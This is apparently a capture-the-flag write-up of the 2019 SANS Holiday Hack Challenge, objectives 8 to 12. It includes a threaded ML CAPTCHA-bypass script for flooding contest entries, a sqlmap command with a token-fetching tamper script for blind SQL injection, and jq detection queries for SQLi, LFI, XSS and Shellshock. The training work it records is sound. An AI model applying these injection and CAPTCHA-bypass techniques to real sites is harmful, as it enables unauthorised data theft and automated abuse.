The &#8220;capteha_api&#8221; code that Krampus provides has a section in the middle that says &#8220;MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE&#8221;. TensorFlow code can go there, however after I got the code working it would not complete fast enough to pass the challenge. It would instead return with a &#8220;Timed Out&#8221; error.

That seemed to be a lot of people&#8217;s hang up with this Objective. There are probably many ways to fix that, but my way was to rearrange the code from the TensorFlow demo.

The idea is to do as much of the processing as possible BEFORE creating the web session to Frido Sleigh. There seemed to be a long pause at the start of loading the model before any checking occured. So put the code that loads the TensorFlow model and session above the &#8220;requests.Session()&#8221; call and image checking loop.

The main() function could look something like this:

```python
def main():
    yourREALemailAddress = "dwatts.comptech@gmail.com"

    # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory
    graph = load_graph('/tmp/retrain_tmp/output_graph.pb')
    labels = load_labels("/tmp/retrain_tmp/output_labels.txt")

    # Load up our session
    input_operation = graph.get_operation_by_name("import/Placeholder")
    output_operation = graph.get_operation_by_name("import/final_result")
    sess = tf.compat.v1.Session(graph=graph)

    # Can use queues and threading to spead up the processing
    q = queue.Queue()
    
    # Creating a session to handle cookies
    s = requests.Session()
    url = "https://fridosleigh.com/"

    json_resp = json.loads(s.get("{}api/capteha/request".format(url)).text)
    unknown_images = json_resp['images']                    # A list of dictionaries eaching containing the keys 'base64' and 'uuid'
    challenge_image_type = json_resp['select_type'].split(',')     # The Image types the CAPTEHA Challenge is looking for.
    challenge_image_types = [challenge_image_type[0].strip(), challenge_image_type[1].strip(), challenge_image_type[2].replace(' and ','').strip()] # cleaning and formatting

    #Going to interate over each of our images.
    for image in unknown_images:
        image_bytes = b64decode(image['base64'])
        image_uuid = image['uuid']

        # We don't want to process too many images at once. 10 threads max
        while len(threading.enumerate()) > 10:
            time.sleep(0.0001)

        #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object
        threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, image_uuid, labels, input_operation, output_operation)).start()
    
    print('Waiting For Threads to Finish...')
    while q.qsize() < len(unknown_images):
        time.sleep(0.001)
    
    #getting a list of all threads returned results
    prediction_results = [q.get() for x in range(q.qsize())]
    
    # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
    final_answer = ','.join( [ prediction['image_uuid'] for prediction in prediction_results if prediction['prediction'] in challenge_image_types ] )
```

After running the time-optimized code, you&#8217;ll win the contest and you&#8217;ll receive an email with the Objective solution inside.

```
...
Submitting lots of entries until we win the contest! Entry #104
Submitting lots of entries until we win the contest! Entry #105
Submitting lots of entries until we win the contest! Entry #106
Submitting lots of entries until we win the contest! Entry #107
Submitting lots of entries until we win the contest! Entry #108
{"data":"<h2 id=\"result_header\"> Entries for email address #################### no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. <br><br> Congratulations and Happy Holidays!</h2>","request":true}
```

[<img src="/assets/img/2020/01/image-27.png" />](/assets/img/2020/01/image-27.png)

## Objective 9 &#8211; Retrieve Scraps of Paper from Server

> Gain access to the data on the&nbsp;[Student Portal](https://studentportal.elfu.org/)&nbsp;server and retrieve the paper scraps hosted there. What is the name of Santa&#8217;s cutting-edge sleigh guidance system?&nbsp;_For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: Super Sled-o-matic
  </p>
</blockquote>

The Elf University Student Portal is a site where you can submit an application for enrollment and check it&#8217;s status. To get a hint for the Student Portal, go to Pepper Minstix and do the Graylog Terminal Challenge.

### Terminal Challenge &#8211; Graylog

This challenge is to analyze event data with Graylog and fill out all the questions in the Incident Report. Find the Report by mouse-over in the bottom right corner of the Graylog window.

To figure out what Event ID&#8217;s are in order to search on them, look up [Sysmon EventID](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).

#### Question&nbsp;1:

Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.

What is the full-path + filename of the first malicious file downloaded by Minty?

#### Answer 1:

<blockquote class="wp-block-quote">
  <p>
    C:\Users\minty\Downloads\cookie_recipe.exe
  </p>
</blockquote>

Search with the regular expression /.\*cookie.\*/ to get the answer. Be sure to search in all messages.

#### Question&nbsp;2:

The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the&nbsp;**ip:port**&nbsp;the malicious file connected to first?

#### Answer 2:

<blockquote class="wp-block-quote">
  <p>
    192.168.247.175:4444
  </p>
</blockquote>

You could follow the events found from the first question in sequence, or you could search on the Network Connection EventID 3 and look at the first one with &#8220;/.\*cookie.\*/ AND EventID:3&#8221;

#### Question&nbsp;3:

What was the first command executed by the attacker?

#### Answer 3:

<blockquote class="wp-block-quote">
  <p>
    whoami
  </p>
</blockquote>

Search within the cookie results for EventID:1 and look for commands being entered with &#8220;/._cookie._/ AND EventID:1&#8243;

#### Question&nbsp;4:

What is the one-word service name the attacker used to escalate privileges?

#### Answer 4:

<blockquote class="wp-block-quote">
  <p>
    webexservice
  </p>
</blockquote>

Click on the &#8220;userAccount&#8221; in the field list to the left in order to quickly read what the user account is for the commands found previously. Most of the commands are under &#8220;minty&#8221;, and inspect what happens when they change to no longer showing a user.

#### Question&nbsp;5:

What is the file-path + filename of the binary ran by the attacker to dump credentials?

#### Answer 5:

<blockquote class="wp-block-quote">
  <p>
    C:\cookie.exe
  </p>
</blockquote>

A fast way to inspect the commands is to use the field list on the left and click on the &#8220;CommandLine&#8221; box. Commands will then show above the details so you can quickly follow through what happened. Shortly above the privilege escalation there were calls to download &#8220;mimikatz.exe&#8221;, which is known for dumping credentials. The file is saved as &#8220;cookie.zip&#8221; first, and then again as &#8220;C:\cookie.exe&#8221;, which is then executed.

#### Question&nbsp;6:

The attacker pivoted to another workstation using credentials gained from Minty&#8217;s computer. Which account name was used to pivot to another machine?

#### Answer 6:

<blockquote class="wp-block-quote">
  <p>
    alabaster
  </p>
</blockquote>

Pivot on time by going to the last event in the previous results, which has a command of `cmd \c exit`. Click on &#8220;Show surrounding messages&#8221; button and select 1 minute. Within these results search for network connections from the attacker&#8217;s address &#8220;192.168.247.175&#8221;. All four of them are using &#8220;alabaster&#8221; as the account.

#### Question&nbsp;7:

What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?

#### Answer 7:

<blockquote class="wp-block-quote">
  <p>
    06:04:28
  </p>
</blockquote>

Look up [logon events](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events) and find the Remote Desktop Connection type. The logon type needed is 10, so search &#8220;LogonType:10&#8221; in all messages. Only one of the results has __a Windows Event ID **4624** , grab it&#8217;s time and that&#8217;s the answer.

#### Question&nbsp;8:

The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the&nbsp;**SourceHostName,DestinationHostname,LogonType**&nbsp;of this connection?

#### Answer 8:

<blockquote class="wp-block-quote">
  <p>
    elfu-res-wks2,elfu-res-wks3,3
  </p>
</blockquote>

Search for network logons with &#8220;EventID:4624 AND LogonType:3&#8221;, then look through the listing for connections from the computer &#8220;elfu-res-wks2&#8221;, where the RDP connection was on.

#### Question&nbsp;9:

What is the full-path + filename of the secret research document after being transferred from the third host to the second host?

#### Answer 9:

<blockquote class="wp-block-quote">
  <p>
    C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf
  </p>
</blockquote>

Search for files created on the second computer with &#8220;EventID:2 AND source:elfu-res-wks2&#8221;. In the displayed field list, only select Message and TargetFilename in order to quickly see what was downloaded. Look through the listing and you&#8217;ll see an interesting PDF.

#### Question&nbsp;10:

What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?

#### Answer 10:

<blockquote class="wp-block-quote">
  <p>
    104.22.3.84
  </p>
</blockquote>

Search on the filename and you&#8217;ll see there was a command to upload it to &#8220;pastebin.com&#8221;. Show surrounding messages for just 1 second from that event, and you&#8217;ll see a network connection made to pastebin.com with the IP address listed.

### Hint

<blockquote class="wp-block-quote">
  <p>
    That&#8217;s it &#8211; hooray!<br />Have you had any luck retrieving scraps of paper from the Elf U server?<br />You might want to look into SQL injection techniques.<br />OWASP is always a good resource for web attacks.<br />For blind SQLi, I&#8217;ve heard Sqlmap is a great tool.<br />In certain circumstances though, you need custom tamper scripts to get things going!
  </p>
  
  <cite>Alabaster Snowball</cite>
</blockquote>

His hint basically shows that you have to do SQL injection to solve this Objective. Alabaster also lets us know that tamper scripts with Sqlmap is useful for this.

### Solution

There are two pages in the Student Portal that are vulnerable to SQL injection. The &#8220;Apply Now&#8221; page where you submit your application uses a POST request with several variables, and the &#8220;Check Application Status&#8221; page uses a simple GET request. Both pages are viable to solve the the Objective. I used the GET request since it won&#8217;t create new records in the database. Of course you have to create an application to check against or it&#8217;ll return &#8220;No application found&#8221;.

#### SQL Command

```
sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=elfelif@nowhere.net*" --tamper="hhctamper.py" --skip-urlencode -v2 -o --prefix="'" --suffix=" -- " -D "elfu"
```

There is an authentication token that expires too quickly to use in a command like this, since you have to first generate the token with a request to &#8220;validator.php&#8221; and by the time you can type it into a sqlmap command it&#8217;s already expired. That&#8217;s where the hint about tamper scripts comes in. Use Sqlmap&#8217;s tamper script functionality and make a call to get the token before using the returned data in the call to &#8220;application-check.php&#8221;.

#### Tamper Script

```
#!/usr/bin/python

import base64
import urllib
import requests


def tamper(payload, **kwargs):
    token = requests.get("https://studentportal.elfu.org/validator.php").text
    data = payload + "&token=" + token

    return data
```

#### Database

The database to dump is &#8220;elfu&#8221; and it has three user tables, &#8220;applications&#8221;, &#8220;students&#8221;, and &#8220;krampus&#8221;. The &#8220;applications&#8221; table is way too large to dump as it holds attempts from thousands of people at the convention, so skip dumping that one with Ctrl-C at the time. The &#8220;krampus&#8221; table is what holds the scraps of paper.

```
Table: krampus
 [6 entries]
 +----+-----------------------+
 | id | path                  |
 +----+-----------------------+
 | 1  | /krampus/0f5f510e.png |
 | 2  | /krampus/1cc7e121.png |
 | 3  | /krampus/439f15e6.png |
 | 4  | /krampus/667d6896.png |
 | 5  | /krampus/adb798ca.png |
 | 6  | /krampus/ba417715.png |
 +----+-----------------------+
```

#### Paper Scraps

After you download all the images found, you&#8217;ll need to piece them together like a jigsaw puzzle and figure out what the original letter said. It could look something like this:

[<img src="/assets/img/2020/01/image-28-890x1024.png" />](/assets/img/2020/01/image-28.png)

After you study it a little bit, you&#8217;ll piece out what the text says, where you&#8217;ll find the name of Santa&#8217;s sleigh guidance system to answer the Objective.

<pre class="wp-block-preformatted">From the Desk of ---
Date: August 23, 2019
Memo to Self:

Finally! I've figured out how to destroy Christmas!
Santa has a brand new, cutting edge sleigh guidance
technology, call the Super Sled-o-matic.

I've figured out a way to poison the data going into the 
system so that it will divert Santa's sled on Christmas
Eve!

Santa will be unable to make the trip and the holiday
season will be destroyed! Santa's own technology will 
undermine him!

That's what they deserve for not listening to my
suggestions for supporting other holiday characters!

Bwahahahahaha!</pre>

## Objective 10 &#8211; Recover Cleartext Document

> The [Elfscrow Crypto](https://downloads.elfu.org/elfscrow.exe) tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can&#8217;t send you the source, but we do have [debug symbols](https://downloads.elfu.org/elfscrow.pdb) that you can use.
> 
> Recover the plaintext content for this [encrypted document](https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc). We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.&nbsp;
> 
> What is the middle line on the cover page? (Hint: it&#8217;s five words)
> 
> _For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: Machine Learning Sleigh Route Finder
  </p>
</blockquote>

<!--StartFragment-->

## Objective 11 &#8211; Open the Sleigh Shop Door

> Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?  
> For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: The Tooth Fairy
  </p>
</blockquote>

<img src="/assets/img/2020/01/image-31.png" /> 

For this Objective, you have to go to the Student Union and find the Sleigh Shop in the corner. An elf named Shinny Upatree stands there, and at this point in the game there will be a crate also. Shinny claims to have written down the name of the attacker and put it in this crate, but it&#8217;s only opened by solving his riddles.

<blockquote class="wp-block-quote">
  <p>
    Psst &#8211; hey!<br />I&#8217;m Shinny Upatree, and I know what&#8217;s going on!<br />Yeah, that&#8217;s right &#8211; guarding the sleigh shop has made me privvy to some serious, high-level intel.<br />In fact, I know WHO is causing all the trouble.<br />Cindy? Oh no no, not that who. And stop guessing &#8211; you&#8217;ll never figure it out.<br />The only way you could would be if you could break into <a href="https://crate.elfu.org/">my crate</a>, here.<br />You see, I&#8217;ve written the villain&#8217;s name down on a piece of paper and hidden it away securely!
  </p>
  
  <cite>Shinny Upatree</cite>
</blockquote>

<img src="/assets/img/2020/01/image-32.png" />

### Riddle 1

<blockquote class="wp-block-quote">
  <p>
    You don&#8217;t need a clever riddle to open the console and scroll a little.
  </p>
</blockquote>

Follow the instructions and open the developer&#8217;s console to see the unlock code. Then enter it into the lock image, and press &#8220;UNLOCK&#8221;. The light will turn red once that code is accepted.

[<img src="/assets/img/2020/01/image-33-1024x737.png" />](/assets/img/2020/01/image-33.png)

### Riddle 2

<blockquote class="wp-block-quote">
  <p>
    Some codes are hard to spy, perhaps they&#8217;ll show up on pulp with dye?
  </p>
</blockquote>

This riddle is referring to print on paper, so look into the &#8220;Print Preview&#8221; to see the code.

[<img src="/assets/img/2020/01/image-34.png" />](/assets/img/2020/01/image-34.png)

### Riddle 3

<blockquote class="wp-block-quote">
  <p>
    This code is still unknown; it was fetched but never shown.
  </p>
</blockquote>

Open Network in the Developer Tools and see what&#8217;s loaded but never shown. Might have to reload the page to capture the traffic.

[<img src="/assets/img/2020/01/image-35-1024x737.png" />](/assets/img/2020/01/image-35.png)

### Riddle 4

<blockquote class="wp-block-quote">
  <p>
    Where might we keep the things we forage? Yes, of course: Local barrels!
  </p>
</blockquote>

Find this one in the Local Storage tab of Developer&#8217;s Console.

[<img src="/assets/img/2020/01/image-36-1024x737.png" />](/assets/img/2020/01/image-36.png)

### Riddle 5

<blockquote class="wp-block-quote">
  <p>
    Did you notice the code in the title? It may very well prove vital.
  </p>
</blockquote>

Look at the title in the HTML Elements Tab.

[<img src="/assets/img/2020/01/image-37-1024x737.png" />](/assets/img/2020/01/image-37.png)

### Riddle 6

<blockquote class="wp-block-quote">
  <p>
    n order for this hologram to be effective, it may be necessary to increase your perspective.
  </p>
</blockquote>

Delete the “perspective” CSS element.

[<img src="/assets/img/2020/01/image-38-1024x737.png" />](/assets/img/2020/01/image-38.png)

Then you&#8217;ll see a code in the rainbow box. Type it in as shown.

[<img src="/assets/img/2020/01/image-39-1024x393.png" />](/assets/img/2020/01/image-39.png)

### Riddle 7

<blockquote class="wp-block-quote">
  <p>
    The font you&#8217;re seeing is pretty slick, but this lock&#8217;s code was my first pick.
  </p>
</blockquote>

Find the font-family property in the HTML head.

[<img src="/assets/img/2020/01/image-40-1024x737.png" />](/assets/img/2020/01/image-40.png)>

### Riddle 8

<blockquote class="wp-block-quote">
  <p>
    In the event that the&nbsp;.eggs&nbsp;go bad, you must figure out who will be sad.
  </p>
</blockquote>

Search for &#8220;eggs&#8221; in the HTML for an element with a class of &#8220;eggs&#8221;. Highlight the found element and look at its &#8220;Event Listeners&#8221;. There is a listener for &#8220;spoil&#8221; and the handler makes assigns 'VERONICA = sad'. Type in VERONICA.

[<img src="/assets/img/2020/01/image-41-1024x737.png" />](/assets/img/2020/01/image-41.png)

### Riddle 9

<blockquote class="wp-block-quote">
  <p>
    This&nbsp;next&nbsp;code will be&nbsp;unredacted, but&nbsp;only&nbsp;when&nbsp;all the&nbsp;chakras&nbsp;are&nbsp;:active.
  </p>
</blockquote>

Search for &#8220;chakra&#8221; in the HTML to find 5 words with the &#8220;chakra&#8221; class. Force each word to be in an &#8220;:active&#8221; state and sections of the code will appear. You can also just read the code sections in the CSS by searching for &#8220;chakra&#8221;.

[<img src="/assets/img/2020/01/image-42-1024x737.png" />](/assets/img/2020/01/image-42.png) 

### Riddle 10

<blockquote class="wp-block-quote">
  <p>
    Oh, no! This lock&#8217;s out of commission! Pop off the cover and locate what&#8217;s missing.
  </p>
</blockquote>

First, remove the cover image by modifying a CSS property for &#8216;cover&#8217;.

[<img src="/assets/img/2020/01/image-43-1024x737.png" />](/assets/img/2020/01/image-43.png)

Next, you have to find three components that are defined in the CSS, and put them on the circuit board.

[<img src="/assets/img/2020/01/image-44-1024x737.png" />](/assets/img/2020/01/image-44.png)

Discover where they are in the HTML by searching for &#8220;component&#8221;. You can then drag the HTML element down to the lock area. That will allow you to enter the code and push the button.

[<img src="/assets/img/2020/01/image-45-1024x737.png" />](/assets/img/2020/01/image-45.png)

Find the lock&#8217;s code written on the circuit board.

[<img src="/assets/img/2020/01/image-46.png" />](/assets/img/2020/01/image-46.png)

### The Note

After solving entering the code in for all of the locks, the note will appear with the answer on it.

### Terminal Challenge &#8211; Smart Braces

<blockquote class="wp-block-quote">
  <p>
    OK, this is starting to freak me out!<br />Oh sorry, I&#8217;m Kent Tinseltooth. My Smart Braces are acting up.<br />Do… Do you ever get the feeling you can hear things? Like, voices?<br />I know, I sound crazy, but ever since I got these… Oh!<br />Do you think you could take a look at my Smart Braces terminal?<br />I&#8217;ll bet you can keep other students out of my head, so to speak.<br />It might just take a bit of Iptables work.
  </p>
  
  <cite>Kent Tinseltooth</cite>
</blockquote>

Opening this terminal slowly shows dialog text between Kent Tinseltooth and someone named &#8220;Inner Voice&#8221;.

[<img src="/assets/img/2020/01/image-47.png" />](/assets/img/2020/01/image-47.png)

Read the file in the home directory, &#8220;IOTteethBraces.md&#8221; to find out what to do next. Due to questions about who the &#8220;Inner Voice&#8221; actually was, Kent wants to further secure the device by configuring the firewall to harden it.

There are 6 rules that need to be applied with &#8220;[iptables](https://linux.die.net/man/8/iptables)&#8220;:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.  
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.  
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).  
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.  
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.  
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.

And here are commands to use for inputting them in relative order:

1. elfuuser@25f4a0a345d9:~$ sudo iptables -P FORWARD DROP  
elfuuser@25f4a0a345d9:~$ sudo iptables -P OUTPUT DROP  
elfuuser@25f4a0a345d9:~$ sudo iptables -P INPUT DROP  
2. sudo iptables -A INPUT -m conntrack &#8211;ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -A OUTPUT -m conntrack &#8211;ctstate ESTABLISHED,RELATED -j ACCEPT  
3. sudo iptables -A INPUT -p tcp -s 172.19.0.225 &#8211;dport 22 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
4. sudo iptables -A INPUT -p tcp &#8211;dport 21 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
sudo iptables -A INPUT -p tcp &#8211;dport 80 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
5. sudo iptables -A OUTPUT -p tcp &#8211;dport 80 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
6. sudo iptables -A INPUT -i lo -j ACCEPT

#### Hint

Oh thank you! It&#8217;s so nice to be back in my own head again. Er, alone.  
By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.  
There are funny rhymes, references to perspective, and odd mentions of eggs!  
And if you think the stuff in your browser looks strange, you should see the page source&#8230;  
Special tools? No, I don&#8217;t think you&#8217;ll need any extra tooling for those locks.  
BUT &#8211; I&#8217;m pretty sure you&#8217;ll need to use Chrome&#8217;s developer tools for that one.  
Or sorry, you&#8217;re a Firefox fan?  
Yeah, Safari&#8217;s fine too &#8211; I just have an ineffible hunger for a physical Esc key.  
Edge? That&#8217;s cool. Hm? No no, I was thinking of an unrelated thing.  
Curl fan? Right on! Just remember: the Windows one doesn&#8217;t like double quotes.  
Old school, huh? Oh sure &#8211; I&#8217;ve got what you need right here&#8230;

### The Tooth Fairy and Sleigh Shop

[<img src="/assets/img/2020/01/image-48-1024x548.png" />](/assets/img/2020/01/image-48.png)

<blockquote class="wp-block-quote">
  <p>
    I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.<br />I hate how Santa is so beloved, but only works one day per year!<br />He has all of the resources of the North Pole and the elves to help him too.<br />I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.<br />But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!<br />But, although you found me, you haven’t foiled my plot!<br />Santa’s sleigh will NOT be able to find its way.<br />I will get my revenge and respect!<br />I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!!
  </p>
  
  <cite>Tooth Fairy</cite>
</blockquote>

Upon entering the Sleigh Shop, you&#8217;ll see the mastermind Tooth Fairy and can find out why she sabotaged Christmas. Also you get access to the sleigh guidance system.

## Objective 12 &#8211; Filter Out Poisoned Sources of Weather Data

> Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa&#8217;s flight mapping software. [Block the 100 offending sources of information to guide Santa&#8217;s sleigh](https://srf.elfu.org/) through the attack. Submit the Route ID (&#8220;RID&#8221;) success value that you&#8217;re given. _For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.

Clicking on the computer for the Sleigh Route Finder opens your browser to their guidance app. Credentials given earlier do nothing with this system, so you have to find the proper login to get further. Also, there are hints to get from Wunorse Openslae by his Terminal Challenge.

### Terminal Challenge &#8211; Zeek JSON Analysis

<blockquote class="wp-block-quote">
  <p>
    Wunorse Openslae here, just looking at some Zeek logs.<br />I&#8217;m pretty sure one of these connections is a malicious C2 channel&#8230;<br />Do you think you could take a look?<br />I hear a lot of C2 channels have very long connection times.<br />Please use <code>jq</code> to find the longest connection in this data set.<br />We have to kick out any and all grinchy activity!
  </p>
  
  <cite>Wunorse Openslae</cite>
</blockquote>

[<img src="/assets/img/2020/01/image-49.png" />](/assets/img/2020/01/image-49.png)

All you have to do is use `jq -s 'max_by(.duration)' conn.log` to get the maximum and answer the question with the resp_h address.

```json
{
  "ts": "2019-04-18T21:27:45.402479Z",
  "uid": "CmYAZn10sInxVD5WWd",
  "id.orig_h": "192.168.52.132",
  "id.orig_p": 8,
  "id.resp_h": "13.107.21.200",
  "id.resp_p": 0,
  "proto": "icmp",
  "duration": 1019365.337758,
  "orig_bytes": 30781920,
  "resp_bytes": 30382240,
  "conn_state": "OTH",
  "missed_bytes": 0,
  "orig_pkts": 961935,
  "orig_ip_bytes": 57716100,
  "resp_pkts": 949445,
  "resp_ip_bytes": 56966700
}
```

#### Post Dialogue with Hints
>That's got to be the one - thanks!  
>Hey, you know what? We've got a crisis here.  
>You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.  
>All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!  
>I'm so flummoxed I can't even remember how to login!  
>Hmm... Maybe the Zeek http.log could help us.  
>I worry about LFI, XSS, and SQLi in the Zeek log - oh my!  
>And I'd be shocked if there weren't some shell stuff in there too.  
>I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.  
>If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.  
>The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.  
>Try not to block many legitimate weather station IPs as that could also cause route calculation failure.  
>Remember, when looking at JSON data, jq is the tool for you!  

### Sleigh Route Finder Application

The computer in the sleigh room brings up the [Sleigh Route Finder](https://srf.elfu.org/) flight mapping app. The login is not provided so it will have to be discovered. Then use the hints gathered for solving Objective 12 within this app.

#### Login Credentials

There were some hints given about the login system:
1. Kent Tinseltooth mentioned this system uses default credentials
2. This is the system pictured in the encrypted PDF from Objective 10
3. The PDF mentions the default credentials are in a ElfU Research Labs git repository

With the above hints you know to look for default creds that are found in a git repo. The 'http.log' file given in the Objective Description has captured traffic from the mentioned git repo. Find the traffic with `cat http.log | jq '.[]' | grep -i 'readme'`. Then go to the address found and you'll find the creds.

#### Hints gathered from Wunorse Openslae
1. App is based on ML algorithms that consume weather data
2. Weather stations are sending bad data to corrupt the algorithm
3. Use the 'http.log' file 
4. Look for Local File Includes
5. Look for Cross Site Scripting
6. Look for SQL injection
7. Look for Shell Shock Exploits
8. Block IP addresses from events found
9. Pivoting will be involved
10. Only most of the bad IPs need to be found (there are 100 according to Objective Description)
11. Use 'jq'

#### SQL Injection
There are 29 SQLi events to find. Use these commands and note the originating host address:
* `cat http.log | jq '.[] | select(. | tostring | match("SELECT"))'`
* `cat http.log | jq '.[] | select(.username | contains("1=1"))'`
* `cat http.log | jq '.[] | select(.user_agent | tostring | match("SELECT"))'`
* `cat http.log | jq '.[] | select(.uri | tostring | match("SELECT"))'`

#### Local File Includes
There are 11 events to find for LFI.
* `cat http.log | jq '.[] | select(. | tostring | contains("../.."))'`
* `cat http.log | jq '.[] | select(. | tostring | contains(".|./.|."))'`
* `cat http.log | jq '.[] | select(. | tostring | contains(".%2e/.%2e"))'`
* `cat http.log | jq '.[] | select(. | tostring | contains("/etc/passwd"))'`

#### Cross Site Scripting
There are 16 XSS events to find.
* `cat http.log | jq '.[] | select(. | tostring | match("<script>";"i"))'`

#### Shellshock
There are 6 Shellshock events to find.
* `cat http.log | jq '.[] | select(. | tostring | contains("};"))'`

#### Pivoting
The extracted events found with the above queries will only get 62 addresses, and pivoting on the user-agent will be required to find the rest. There are several steps involved in the process.

1. List all the addresses found so far and put them in a 'jq' query to find all the events. It could look like `cat http.log | jq '.[] | select(."id.orig_h" | contains("42.103.246.250") or contains("2.230.60.70") or contains("10.155.246.29") or contains("225.191.220.138") or contains("75.73.228.192") or contains("249.34.9.16") or contains("27.88.56.114") or contains("238.143.78.114") or contains("121.7.186.163") or contains("106.132.195.153") or contains("129.121.121.48") or contains("190.245.228.38") or contains("34.129.179.28") or contains("135.32.99.116") or contains("2.240.116.254") or contains("45.239.232.245") or contains("68.115.251.76") or contains("118.196.230.170") or contains("173.37.160.150") or contains("81.14.204.154") or contains("135.203.243.43") or contains("186.28.46.179") or contains("13.39.153.254") or contains("111.81.145.191") or contains("0.216.249.31") or contains("33.132.98.193") or contains("84.185.44.166") or contains("254.140.181.172") or contains("150.50.77.238") or contains("230.246.50.221") or contains("223.149.180.133") or contains("187.178.169.123") or contains("116.116.98.205") or contains("28.169.41.122") or contains("102.143.16.184") or contains("131.186.145.73") or contains("253.182.102.55") or contains("229.133.163.235") or contains("23.49.177.78") or contains("9.206.212.33") or contains("56.5.47.137") or contains("19.235.69.221") or contains("69.221.145.150") or contains("42.191.112.181") or contains("48.66.193.176") or contains("49.161.8.58") or contains("84.147.231.129") or contains("44.74.106.131") or contains("106.93.213.219") or contains("61.110.82.125") or contains("65.153.114.120") or contains("123.127.233.97") or contains("95.166.116.45") or contains("80.244.147.207") or contains("168.66.108.62") or contains("200.75.228.240") or contains("31.254.228.4") or contains("220.132.33.81") or contains("83.0.8.119") or contains("150.45.133.97") or contains("229.229.189.246") or contains("227.110.45.126"))'`
2. Add "&#124; .user_agent" at the end of the query in order to extract the user agents.
3. Weed out the user agents that are obviously malicious traffic and not really user agents.
4. Use a 'jq' command to figure out which addresses had which user agent.
5. Note the user agents with exactly two addresses each, there will be many.
6. One of the addresses in each group of two is already known to be bad, and the other is an additional bad actor that can be added to the list. 

The quick way to curate the final list is to extract each group of two and put in a spreadsheet with the original 62 addresses, then run a remove duplicates function on it. The final count should be 97. I don't know what the final 3 are. Make the list comma separated and submit it to the SRF Firewall for the win!

> **Route Calculation Success! RID:0807198508261964**

## Wrapping up
Once the Route ID has been submitted to pass the Objective, you have access to the Bell Tower.
[<img src="/assets/img/2020/01/2020-02-12-22-21-12.png" />](/assets/img/2020/01/2020-02-12-22-21-12.png)

Where you'll see Santa again, along with Krampus and the guilty Tooth Fairy.
[<img src="/assets/img/2020/01/2020-02-12-22-24-25.png" />](/assets/img/2020/01/2020-02-12-22-24-25.png)

Santa's final dialogue:
>You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!
>Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!
>Ho Ho Ho!
>The more I laugh, the more I fill with glee.
>And the more the glee,
>The more I'm a merrier me!
>Merry Christmas and Happy Holidays.

Krampus's final dialogue:
>Congratulations on a job well done!
>Oh, by the way, I won the Frido Sleigh contest.
>I got 31.8% of the prizes, though I'll have to figure that out.

Tooth Fairy's final dialogue:
>You foiled my dastardly plan! I’m ruined!
>And I would have gotten away with it too, if it weren't for you meddling kids!

And in the corner, you'll see a note on the ground.

>Thankfully, I didn't have to implement my plan by myself! Jack Frost promised to use his wintry magic to help me subvert Santa's horrible reign of holiday merriment NOW and FOREVER!  
>--<cite>LetterOfWintryMagic</cite>

Seems next year we'll have to contend with Ol' Jack Frost!!